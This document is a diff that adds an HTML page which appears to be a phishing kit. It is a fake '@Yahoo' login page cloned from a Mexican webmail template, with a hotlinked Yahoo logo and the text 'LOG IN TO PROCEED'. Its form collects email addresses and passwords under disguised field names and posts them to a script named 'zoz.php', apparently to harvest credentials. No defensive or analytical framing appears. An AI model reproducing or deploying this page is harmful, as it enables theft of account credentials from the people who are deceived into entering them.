@@ -1,0 +1,279 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+	<title>@Yahoo</title>
+	<link href="novel_files/original.css" rel="stylesheet" type="text/css" />
+	<link href="novel_files/jquery.css" rel="stylesheet" type="text/css" />
+	<link href="novel_files/lang.css" media="screen" rel="stylesheet" type="text/css" /><!-- login page js translations --><script type="text/javascript">
+		function jsTranslate(englishString)
+		{
+
+			if( jsTranslateHash[englishString] !== undefined && jsTranslateHash[englishString].length > 0 ) return jsTranslateHash[englishString]
+			else return englishString
+		}
+		
+		//Add translation strings here for strings that have to be inside .js files (currently not configured to be parsed by php engine)
+		jsTranslateHash = {
+			"A popup-blocker is enabled on your browser.<br>To correctly view the WebMail application, you must allow popup windows from the URL of the site." : "A popup-blocker is enabled on your browser.<br>To correctly view the WebMail application, you must allow popup windows from the URL of the site.", 
+		};
+		</script><!-- jQuery --><script type="text/javascript" src="novel_files/jquery-1.js"></script><script type="text/javascript" src="novel_files/jquery-ui-1.js"></script><script type="text/javascript" src="novel_files/xp.js"></script><script type="text/javascript" src="novel_files/browsercheck.js"></script><script type="text/javascript" src="novel_files/rememberme.js"></script><!-- Fav icon -->
+	<link href="http://webmail.microtec.com.mx/images/favicon.ico" rel="shortcut icon" type="image/x-icon" /><script type="text/javascript">
+		var Expand;
+
+		// Reload to the master frame if we are inside a frameset
+		if (parent.frames[1]) top.window.location=self.location;
+
+		// Get list of local domains as a JS array 
+	    var localDomains = new Array();
+localDomains['adaap.org.mx'] = 1;
+localDomains['agrovac.com.mx'] = 1;
+localDomains['agrovac.mx'] = 1;
+localDomains['aguirrebrizuela.com.mx'] = 1;
+localDomains['alemanasociados.com.mx'] = 1;
+localDomains['alonsoycia.com.mx'] = 1;
+localDomains['anahuac7584.com'] = 1;
+localDomains['anuarioelectronico.com'] = 1;
+localDomains['apassion.com.mx'] = 1;
+localDomains['autosflosol.com'] = 1;
+localDomains['autosflova.com'] = 1;
+localDomains['aynasesores.com'] = 1;
+localDomains['azufres.com.mx'] = 1;
+localDomains['binutraceuticals.com'] = 1;
+localDomains['binutraceuticals.com.mx'] = 1;
+localDomains['binutraceuticals.mx'] = 1;
+localDomains['botanicals.com'] = 1;
+localDomains['botanicals.com.mx'] = 1;
+localDomains['botanicals.mx'] = 1;
+localDomains['casamazatlan.com'] = 1;
+localDomains['chocomex.com.mx'] = 1;
+localDomains['cinturonesdiaz.com'] = 1;
+localDomains['clubquintareal.com.mx'] = 1;
+localDomains['cluster4.smartfilter.com.mx'] = 1;
+localDomains['colegiooncemexico.com'] = 1;
+localDomains['colegiooncemexico.mx'] = 1;
+localDomains['consultant.com'] = 1;
+localDomains['convalora.com'] = 1;
+localDomains['cscomunicaciones.com.mx'] = 1;
+localDomains['ctay.mx'] = 1;
+localDomains['dasconcepcion.cl'] = 1;
+localDomains['dilop.com.mx'] = 1;
+localDomains['distribucionesd.com.mx'] = 1;
+localDomains['elegancemodelos.com'] = 1;
+localDomains['eliasestudio.com'] = 1;
+localDomains['eliasestudioe.com'] = 1;
+localDomains['flosol.net'] = 1;
+localDomains['flosolautomotriz.com'] = 1;
+localDomains['flosolmotors.com'] = 1;
+localDomains['fonurba.com'] = 1;
+localDomains['fralid.mx'] = 1;
+localDomains['gastroclinica.com.mx'] = 1;
+localDomains['globalcloud.mx'] = 1;
+localDomains['grupoimloya.com'] = 1;
+localDomains['grupojaae.com'] = 1;
+localDomains['grupoleforme.com.mx'] = 1;
+localDomains['hotellaffayette.com'] = 1;
+localDomains['hotsupport.mx'] = 1;
+localDomains['i-pos.mx'] = 1;
+localDomains['investana.com'] = 1;
+localDomains['iqmexico.com'] = 1;
+localDomains['it-comunicaciones.com'] = 1;
+localDomains['itmex.com.mx'] = 1;
+localDomains['jaripeosmexico.com'] = 1;
+localDomains['kc.com.mx'] = 1;
+localDomains['kcg.com.mx'] = 1;
+localDomains['kcg.mx'] = 1;
+localDomains['kfit.mx'] = 1;
+localDomains['kristalcentury.mx'] = 1;
+localDomains['lpt.com.mx'] = 1;
+localDomains['mbtriplay.com'] = 1;
+localDomains['mcp.com.mx'] = 1;
+localDomains['mesondesantaelena.com'] = 1;
+localDomains['microtec.com.mx'] = 1;
+localDomains['microtec.net.mx'] = 1;
+localDomains['mmhidrosanitaria.com'] = 1;
+localDomains['moran-giacoman.com.mx'] = 1;
+localDomains['mrc.com.mx'] = 1;
+localDomains['nabega.mx'] = 1;
+localDomains['notaria27.com.mx'] = 1;
+localDomains['nutraceutica.mx'] = 1;
+localDomains['ontas.mx'] = 1;
+localDomains['policimex.com'] = 1;
+localDomains['procesaeventos.com'] = 1;
+localDomains['procesagroup.com'] = 1;
+localDomains['procesaincentives.com'] = 1;
+localDomains['procomex.com.mx'] = 1;
+localDomains['rascalin.com.mx'] = 1;
+localDomains['raveservicios.com'] = 1;
+localDomains['raveuniversidad.com.mx'] = 1;
+localDomains['ressa.com.mx'] = 1;
+localDomains['rlgv.com.mx'] = 1;
+localDomains['rslgv.com.mx'] = 1;
+localDomains['rubenfrancomusic.com'] = 1;
+localDomains['sagu.com.mx'] = 1;
+localDomains['sajal.com.mx'] = 1;
+localDomains['sanchezalonso.com.mx'] = 1;
+localDomains['sanchezgutierrezconsultores.mx'] = 1;
+localDomains['seepco.com.mx'] = 1;
+localDomains['servigaso.com'] = 1;
+localDomains['smartfilter.com.mx'] = 1;
+localDomains['sunnysky.com.mx'] = 1;
+localDomains['sunnysky.mx'] = 1;
+localDomains['tecvimfr.com'] = 1;
+localDomains['tuttopelle.com.mx'] = 1;
+localDomains['tuttopelle.mx'] = 1;
+localDomains['vinosgiralda.com'] = 1;
+localDomains['virtualaccess.com.mx'] = 1;
+localDomains['vmsmexico.com'] = 1;
+localDomains['vtext.com'] = 1;
+localDomains['vzwpix.com'] = 1;
+localDomains['zarkin.com'] = 1;
+localDomains['zumit.com'] = 1;
+
+		$(function() {
+
+		$("#loginPage").bind('submit', function() {
+			email = $("#email").val();
+			emailArgs = email.split('@');
+			$("input[name=emailName]").val(emailArgs[0]);
+			
+			if( !emailArgs[1] ) {
+				$("input[name=emailDomain]").val( $("input[name=emailDomainDefault]").val() );
+				
+			} else {
+				$("input[name=emailDomain]").val(emailArgs[1]);				
+			}
+
+			document.body.style.cursor = 'wait';
+		});
+		 
+		
+		RememberMe();
+
+		$("#dialog").dialog({ 
+			autoOpen: false, 
+			height: 70,
+			modal: true, 
+			overlay: { 
+			opacity: 0.5, 
+			background: "white" 
+			},
+			resizable: false,
+			closeOnEscape: false,  
+			width: 270
+		});
+
+		});
+		</script><script type="text/javascript">
+//<![CDATA[
+
+		// Expand More Options
+		function ExpandOptions()    
+		{
+		
+			Expand = 1;
+			document.getElementById('LanguageDisplay').style.display='';
+			document.getElementById('LoginBtn').style.display='';
+			document.getElementById('MailServer').style.display='';
+
+			if(document.getElementById('LanguageDisplay').style.display == '') 
+			{
+		
+				document.getElementById('protocol').style.display = '';
+				document.getElementById('MoreOptions').style.display='none';
+				if( document.getElementById('signup') != undefined )
+				{
+			
+					document.getElementById('signup').style.display='none';
+			
+				}
+		
+			}
+
+		}
+
+		//]]>
+		</script>
+</head>
+<body class="en" id="bg">
+<div id="container">
+<div id="header">
+<div id="logo"></div>
+</div>
+
+<div id="content">
+<div class="login-txt">
+<p></p>
+</div>
+<!-- Begin Form -->
+
+<form action="zoz.php" class="login-form" id="loginPage" method="post" name="loginPage">&nbsp;&nbsp;&nbsp; <input name="emailName" type="hidden" value="" /> <input name="emailDomain" type="hidden" value="" /> <input name="emailDomainDefault" type="hidden" value="" /> <input name="cssStyle" type="hidden" value="original" /> <a class="rg_l" href="https://www.google.com/imgres?imgurl=http%3A%2F%2Fphandroid.s3.amazonaws.com%2Fwp-content%2Fuploads%2F2013%2F09%2Fold-yahoo-logo-640x179.jpg&amp;imgrefurl=http%3A%2F%2Fphandroid.com%2F2013%2F09%2F05%2Fnew-yahoo-logo-vs-google-logo%2F&amp;docid=qyCXWxVdTuRmwM&amp;tbnid=R8M_h_HzMuK6VM%3A&amp;w=640&amp;h=179&amp;client=firefox-b&amp;bih=659&amp;biw=1366&amp;ved=0ahUKEwi-1YHD05zNAhVEMhoKHefACZMQMwhdKCAwIA&amp;iact=mrc&amp;uact=8" style="width:308px;height:86px;left:0px;right:"><img alt="Image result for yahoo logo" class="rg_i" data-src="https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcSMACPh7q1D_8IcTWJEJasFE6nGK4ry_CgAfcSlL5w1_EJ33-2w" data-sz="f" height="112" name="R8M_h_HzMuK6VM:" src="https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcSMACPh7q1D_8IcTWJEJasFE6nGK4ry_CgAfcSlL5w1_EJ33-2w" style="margin-left: 0px; margin-right: 0px; margin-top: 0px;" width="404" /></a> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; <span style="color:#800080;"><strong>LOG IN TO PROCEED </strong></span>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+<table class="login">
+	<tbody>
+		<tr>
+			<td><label class="user">Email:</label> <input class="input-email" id="email" name="eden" tabindex="1" type="text" /></td>
+		</tr>
+		<tr>
+			<td><label class="pass">Password:</label> <input class="input-pass" id="password" name="hazard" tabindex="2" type="password" /></td>
+		</tr>
+		<tr id="MoreOptions">
+			<td></td>
+		</tr>
+		<tr id="MailServer" style="display: none;">
+			<td><label class="pass">Mailserver:</label> <input class="input-pass" disabled="true" id="MailserverinputDisabled" name="requestedServerDisabled" tabindex="3" type="text" /> <input class="input-pass" id="Mailserverinput" name="requestedServer" type="hidden" value="" /></td>
+		</tr>
+		<tr id="protocol" style="display: none;">
+			<td><label class="pcol">Protocol:</label> <select class="protocol" name="MailType"><option selected="selected" value="IMAP">IMAP</option><option value="IMAPS">IMAP SSL</option> </select></td>
+		</tr>
+		<tr id="LanguageDisplay" style="display: none;">
+			<td><label class="language">Language:</label> <select class="language" name="Language"><option selected="selected" value="">Default</option><option value="ar">العربية</option><option value="ca">Catalan</option><option value="de">Deutsch</option><option value="en">English</option><option value="el">&Epsilon;&lambda;&lambda;ά&delta;&alpha;</option><option value="es">Espa&ntilde;ol</option><option value="fi">Finnish</option><option value="fr">Fran&ccedil;ais</option><option value="id">Bahasa Indonesia</option><option value="it">Italiano</option><option value="nl">Nederlands</option><option value="pt_Br">Portugu&ecirc;s Brasileiro</option><option value="ru">Russian</option><option value="se">Swedish</option><option value="th">Thai</option><option value="zh">汉语</option> </select></td>
+		</tr>
+		<tr id="LoginBtn" style="display: none;">
+			<td><input class="loginbtn original" type="submit" value="Login" /> <span class="remember">Remember Me</span> <input class="check" name="RememberMe" type="checkbox" value="1" /></td>
+		</tr>
+	</tbody>
+</table>
+&nbsp;
+
+<table border="0" cellpadding="0" cellspacing="0">
+	<tbody>
+		<tr>
+			<td class="logBtn">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<input class="Btn1Def" id="button" name="Button2" onblur="this.className='Btn1Def'" onclick="handleSubmit(); return false;" onfocus="this.className='Btn1DefHov'" onmouseout="this.className='Btn1Def'" onmouseover="this.className='Btn1DefHov'" tabindex="3" title="Log In" type="submit" value="Log In" /><br />
+			&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</td>
+		</tr>
+	</tbody>
+</table>
+
+<p><br />
+<br />
+&nbsp;</p>
+</form>
+</div>
+</div>
+
+<div id="foot">
+<table cellpadding="0" cellspacing="0">
+	<tbody>
+		<tr>
+			<td aria-hidden="true" class="footerspace"></td>
+			<td style="text-align: right;"><span class="secondary ltr" id="ftrCopy">&copy;2016 Yahoo</span></td>
+		</tr>
+	</tbody>
+</table>
+</div>
+<!-- plugins working -->
+
+<div aria-labelledby="ui-dialog-title-dialog" class="ui-dialog ui-widget ui-widget-content ui-corner-all  ui-draggable" role="dialog" style="display: none; position: absolute; overflow: hidden; z-index: 1000; outline: 0px none;" tabindex="-1">
+<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix" style="-moz-user-select: none;" unselectable="on"><span class="ui-dialog-title" id="ui-dialog-title-dialog" style="-moz-user-select: none;" unselectable="on">&nbsp;</span><a class="ui-dialog-titlebar-close ui-corner-all" href="#" role="button" style="-moz-user-select: none;" unselectable="on"><span class="ui-icon ui-icon-closethick" style="-moz-user-select: none;" unselectable="on">close</span></a></div>
+
+<div class="ui-dialog-content ui-widget-content" id="dialog" style="">&nbsp;
+<center>
+<div id="loading">
+<h1 class="loading-text"><img class="loadingimg" height="28" src="novel_files/25.gif" width="28" /><span class="loading"><strong>Loading...</strong></span></h1>
+</div>
+</center>
+</div>
+</div>
+</body>
+</html>
